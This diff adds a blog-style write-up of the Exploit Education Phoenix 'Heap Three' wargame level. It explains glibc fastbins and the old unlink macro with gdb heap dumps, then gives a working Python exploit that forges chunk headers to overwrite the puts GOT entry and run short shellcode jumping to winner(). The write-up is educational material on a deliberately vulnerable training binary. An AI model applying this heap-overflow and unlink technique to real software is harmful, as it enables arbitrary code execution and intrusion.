@@ -1,0 +1,311 @@
+---
+title: "Heap Three"
+permalink: "exploit-education/phoenix/:title"
+layout: post
+---
+
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <time.h>
+#include <unistd.h>
+
+void winner() {
+  printf("Level was successfully completed at @ %ld seconds past the Epoch\n",
+      time(NULL));
+}
+
+int main(int argc, char **argv) {
+  char *a, *b, *c;
+
+  a = malloc(32);
+  b = malloc(32);
+  c = malloc(32);
+
+  strcpy(a, argv[1]);
+  strcpy(b, argv[2]);
+  strcpy(c, argv[3]);
+
+  free(c);
+  free(b);
+  free(a);
+
+  printf("dynamite failed?\n");
+}
+```
+
+This level is by far the hardest one and I learned a lot from it, I really encourage you to read through the references before reading the writeup if you don't know how the heap works.
+
+The code first allocates 3 memory chunks, copies arguments to them then free the allocated memory. The bug here is the use of **strcpy** without size checking so we can overflow the heap.
+
+Every heap chunk will look like this:
+
+```
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+ <-- Chunk start
+ |     PREV_SIZE (if P = 0)  |
+ +-----------------+-+-+-+-+-+
+ |     CHUNK SIZE      |A|M|P|
+ +-----------------+-+-+-+-+-+ <-- Pointer returned by malloc
+ |     USER DATA             |
+ +---------------------------+ <-- Chunk end
+```
+
+An allocated chunk consists of 3 parts. Two of them being 8 byte or 4 byte headers on 64bit/32bit systems respectively. The third chunk is the user data.
+
+The first byte is the size of the previous chunk and it's only set if the previous chunk if free.
+
+The second part **chunk size** is 16 bytes padded, so the last 3 bits are used as flags or properties (**A**rena bit │  **M**MAPed bit │ **P**revious in-use bit), I won't go into details here.
+
+```
+$ gdb -q /opt/phoenix/i486/heap-three 
+Reading symbols from /opt/phoenix/i486/heap-three...(no debugging symbols found)...done.
+
+gef➤  disassemble main 
+Dump of assembler code for function main:
+.....
+   0x0804887d <+129>:	call   0x8048560 <strcpy@plt>
+   0x08048882 <+134>:	add    esp,0x10
+   0x08048885 <+137>:	sub    esp,0xc
+   0x08048888 <+140>:	push   DWORD PTR [ebp-0x14]
+   0x0804888b <+143>:	call   0x8049857 <free>
+.....
+
+gef➤  b *0x08048882
+Breakpoint 1 at 0x8048882
+
+gef➤  r AAAAAAAAAA BBBBBBBBBBB CCCCCCCCCCC
+Starting program: /opt/phoenix/i486/heap-three AAAAAAAAAA BBBBBBBBBBB CCCCCCCCCCC
+Breakpoint 1, 0x08048882 in main ()
+
+gef➤  info proc mappings
+process 324
+Mapped address spaces:
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x804c000     0x4000        0x0 /opt/phoenix/i486/heap-three
+	 0x804c000  0x804d000     0x1000     0x3000 /opt/phoenix/i486/heap-three
+	0xf7e69000 0xf7f69000   0x100000        0x0		======> This is the heap
+.....
+
+gef➤  x/28xw 0xf7e69000
+0xf7e69000:	0x00000000	0x00000029	0x41414141	0x41414141
+0xf7e69010:	0x00004141	0x00000000	0x00000000	0x00000000
+0xf7e69020:	0x00000000	0x00000000	0x00000000	0x00000029
+0xf7e69030:	0x42424242	0x42424242	0x00424242	0x00000000
+0xf7e69040:	0x00000000	0x00000000	0x00000000	0x00000000
+0xf7e69050:	0x00000000	0x00000029	0x43434343	0x43434343
+0xf7e69060:	0x00434343	0x00000000	0x00000000	0x00000000
+```
+
+As you can see each chunk has two words before it's content (prev_size and chunk_size), 0x29 = 101001 and we said the last 3 bits are flags so the real size is 0x28 and the last bit is set indicating the the previous chunk is in use.
+
+When we free these chunks they go to something called **bins** to be reused later by **malloc** if we need to allocate new memory. The heap manager first checks the size of the chunk and if its size is <= **(80 * SIZE_SZ / 4)** which is 80 on 32-bit machine, 160 on 64-bit machine, The chunk will will be will be treated as **fastbin**.
+
+Fast bins are singly linked list of free memory chunks, every chunk points to the next fast bin using the FD (forward pointer) which is written at the first word of the chunk.
+
+Fast bins:
+
+```
+ +-+-+-+-+-+-+-+-+-+-+-+-+-+-+ <-- Chunk start
+ |     PREV_SIZE (if P = 0)  |
+ +-----------------+-+-+-+-+-+
+ |     CHUNK SIZE      |A|M|P|
+ +-----------------+-+-+-+-+-+ <-- Pointer returned by malloc
+ |     FD pointer            |
+ +-----------------+-+-+-+-+-+
+ |     Unused Space          |
+ +---------------------------+ <-- Chunk end
+```
+
+Let's check our chunks after they got freed:
+
+```
+gef➤  b *0x080488b2
+Breakpoint 2 at 0x80488b2
+
+gef➤  c
+Continuing.
+
+gef➤  x/28xw 0xf7e69000
+0xf7e69000:	0x00000000	0x00000029	0xf7e69028	0x41414141
+0xf7e69010:	0x00004141	0x00000000	0x00000000	0x00000000
+0xf7e69020:	0x00000000	0x00000000	0x00000000	0x00000029
+0xf7e69030:	0xf7e69050	0x42424242	0x00424242	0x00000000
+0xf7e69040:	0x00000000	0x00000000	0x00000000	0x00000000
+0xf7e69050:	0x00000000	0x00000029	0x00000000	0x43434343
+0xf7e69060:	0x00434343	0x00000000	0x00000000	0x00000000
+```
+
+As you can see, The first word of chunk **b** points to chunk **c** and first word of chunk **a** points to **b**. we can see that in the code from **malloc-2.7.2.c** implementation (**free** function):
+
+  ```c
+if ((CHUNK_SIZE_T)(size) <= (CHUNK_SIZE_T)(av->max_fast) && (chunk_at_offset(p, size) != av->top)) {
+    set_fastchunks(av);
+    fb = &(av->fastbins[fastbin_index(size)]);		// get forward bin
+    p->fd = *fb;					// FD of current bin = fb
+    *fb = p;						// fb = current bin
+}
+  ```
+
+The exploit here is in this version of malloc is in the **unlink** macro which is used to consolidate continuous free memory chunks together in one big chunk.
+
+```
++-------+       +-------+     +-------+
+|CHUNK 1|       |CHUNK P|     |CHUNK 3|
++-------+       +-------+     +-------+   
+|  FD   |------>|  FD   |---->|  FD   |
++-------+       +-------+     +-------+   
+|  BK   |<------|  BK   |<----|  BK   |
++-------+       +-------+     +-------+
+
+              ,-\-------/.
+,->+-------+  | +\-----/+ `-->+-------+
+|  |CHUNK 1|  | |C\UNK/P|     |CHUNK 3|
+|  +-------+  | +--\-/--+     +-------+   
+|  |  FD   |--´ |  FX   |     |  FD   |
+|  +-------+    +--/-\--+     +-------+   
+|  |  BK   |    | /BK \ |  ,--|  BK   |
+|  +-------+    +/-----\+  |  +-------+
+ `--------------/-------\--+
+```
+
+The problem here is that **unlink** is not used with fastbins so we need to overwrite the size of a chunk to fool the heap manager into thinking that it's not a fastbin (unsorted bin in this case).
+
+Let's see first how unlock works:
+
+```c
+#define 
+unlink(P, BK, FD) {
+  FD = P->fd;                                                          
+  BK = P->bk;                                                          
+  FD->bk = BK;                                                         
+  BK->fd = FD;                                                         
+}
+```
+
+Forward Pointer **FD** is at offset 8 of a free chunk (after the prev_size and chunk_size), and Backward Pointer **BK** is at offset 12 (after FD pointer).
+
+so the last two lines can be translated as: 
+
+[FD + 12] = BK
+[BK + 8] = FD
+
+Great, Now we can write to arbitrary memory but where to write ?? we must choose two addresses as FD and BK and the two of them must be in writable memory regions.
+
+FD can be the **GOT** entry of **puts** function which is called at the end of the code, GOT is writable so no problems here.
+
+Remember the goal of this level is to call **winner** function so we can choose BK as the address of **winner**, the problem is that it's address is at the **.text** section which isn't writable :(
+
+A workaround here is to write a shellcode to a writable memory region and that shellcode will jump to **winner** function, and the best place to write our shellcode is the heap itself (at any of the 3 chunks).
+
+The last bit of the puzzle is to choose the chunk to overwrite it's size to be **unsorted bin** instead of **fast bin**, we will choose chunk **c**.
+
+This is the code that will be executed if not a fastbin:
+
+```c
+nextchunk = chunk_at_offset(p, size);
+nextsize = chunksize(nextchunk);
+
+/* consolidate backward */
+if (!prev_inuse(p)) {					// if the previous chunk is not in use (free)
+    prevsize = p->prev_size;				// get previous size of current chunk
+    size += prevsize;
+    p = chunk_at_offset(p, -((long) prevsize));		// add the prevsize to current position to get to the previous chunk
+    unlink(p, bck, fwd);				// unlink the previous chunk (throw it away)
+}
+
+if (nextchunk != av->top) {					// if the current chunk is not the top of the heap
+    /* get and clear inuse bit */
+    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);	// check if next chunk is in use (not free)
+    set_head(nextchunk, nextsize);
+
+    /* consolidate forward */
+    if (!nextinuse) {						// if next chunk is not in use (free)
+        unlink(nextchunk, bck, fwd);				// unlink the next chunk (throw it away)
+        size += nextsize;
+    }
+    .....
+}
+
+```
+
+We need just on consolidation (one unlink) to write to **GOT**, so we will adjust our exploit to use the backward consolidation.
+
+Chunk **c**:
+
+```
+0xf7e69050:	0xfffffffc	0x00000029	0x00000000	0x43434343
+0xf7e69060:	0x00434343	0x00000000	0x00000000	0x00000000
+```
+
+For **prevsize** we will write 0xfffffffc = -4 to jump to 0xf7e69050+4 = 0xf7e69054 which will be the start of previous chunk.
+
+Now **unlink** will look for **FD**  at 0xf7e69054 + 8 = **0xf7e6905c** and **BK** 0xf7e69054 + 12 = **0xf7e69060**, so we will write those addresses there.
+
+**FD** will be puts_address-12 because at **unlink** [FD + 12] = BK.
+
+**BK** will be just shellcode_address ([BK + 8] will be overwritten but we don't care as our shellcode will be just 6 bytes long).
+
+With that we are done with backward consolidation, now we need to adjust the **size** value to jump to an address which is in use (not free) to avoid calling **unlink** again which might cause a segmentation fault.
+
+Here we will adjust the size to jump to chunk **a**, before forward consolidation the code first checks  **nextinuse** which will check the **prev in use** flag of chunk **b** to check if chunk **a** if free or not, here it's not so the code will just avoid the forward consolidation. the difference between chunk **a** and **c** is 0xf7e69050 - 0xf7e69000 = 80 so **chunk_size** of **c** will be **0xffffffb0 = -80**.
+
+# Solution:
+
+```python
+# solve.py
+
+from pwn import *
+
+puts_addr = 0x804c13c
+shellcode_addr = 0xf7e6900c
+
+'''
+  push 0x80487d5      # winner_address
+  ret
+'''
+shellcode = '\x68\xd5\x87\x04\x08\xc3'
+
+
+buff = ""
+
+# first chunk
+buff += 'AAAA'			# This will be overwritten with FD when free(a)
+buff += shellcode
+buff += ' '
+
+# second chunk
+buff += 'B'*32			# Fill the second chunk
+buff += p32(0xfffffffc)		# prevsize of third chunk = -4 to jump inside itself when consolidating backward
+buff += p32(0xffffffb0)		# size of third chunk = -80 to jump to first chunk when consolidating forward
+buff += ' '
+
+# third chunk
+buff += 'AAAA'			# junk
+buff += p32(puts_addr-12)	# will be p->fd
+buff += p32(shellcode_addr)	# will be p->bk
+
+print(buff)
+```
+
+```
+$ /opt/phoenix/i486/heap-three $(python solve.py)
+Level was successfully completed at @ 1580754261 seconds past the Epoch
+```
+
+This might not be the best explanation but this level really required a lot of reading from different resources to grasp the concepts.
+
+Note that this exploit is already patched in newer version of malloc.
+
+#### References:
+
+[https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)
+
+[https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
+
+[https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/](https://sensepost.com/blog/2017/painless-intro-to-the-linux-userland-heap/)
+
+[https://www.youtube.com/watch?v=gL45bjQvZSU](https://www.youtube.com/watch?v=gL45bjQvZSU)
+
